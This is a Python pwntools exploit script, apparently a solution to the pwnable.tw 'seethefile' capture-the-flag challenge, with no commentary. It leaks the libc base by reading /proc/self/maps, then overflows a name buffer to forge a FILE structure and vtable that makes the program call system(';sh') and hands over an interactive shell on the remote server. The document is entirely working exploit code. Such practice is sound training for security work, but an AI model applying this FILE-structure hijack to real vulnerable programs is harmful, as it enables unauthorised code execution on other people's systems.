from pwn import *
context(arch='i386',log_level='debug')
# p=process("./seethefile",env={"LD_PRELOAD":"./libc_32.so.6"})
p=remote("chall.pwnable.tw",10200)


def Open(name):
	p.sendlineafter('choice :','1')
	p.sendlineafter('see :',name)
def Exit(name):
	p.sendlineafter('choice :','5')
	p.sendlineafter('name :',name)
def Read():
	p.sendlineafter('choice :','2')
def Write():
	p.sendlineafter('choice :','3')

e=ELF('./libc_32.so.6')




b1=0x0804892E
b2=0x8048B0F
# gdb.attach(p,"b *"+str(b1)+'\n'+"b *"+str(b2)+'\n'+"c")
Open('/proc/self/maps')
Read()
Read()
Write()
# p.recvuntil('heap')
# p.recvuntil('000-')
libc_base=int(p.recvuntil('000-')[-9:-1],16)
print hex(libc_base)
name_addr=0x0804B260
# libc_base=0xf7e1f000

sys_addr=libc_base+e.symbols['system']
# payload='zhanghao'
# payload=p32(0xfbad2488)+'a'*0x1c+p32(name_addr)+' || sh'.rjust(0x90-0x24,'a')+p32(name_addr+0x94)+'\x01'*(17*4)+p32(sys_addr)
file_base=0x0804B284
payload='a'*0x20+p32(file_base)

payload+=p32(0xffffffff)+';sh'.ljust(0x30,'\x00')+p32(0)+p32(0)+'\x00'*12+p32(0)+p32(0xffffffff)*2+'\x00'*4+p32(0)+'\x00'*(0xa0-0x68)+p32(file_base+0x94+0x4)
print len(payload)
assert len(payload)==0x24+0x98
payload+='\x00'*8+p32(sys_addr)*20
Exit(payload)




p.interactive()
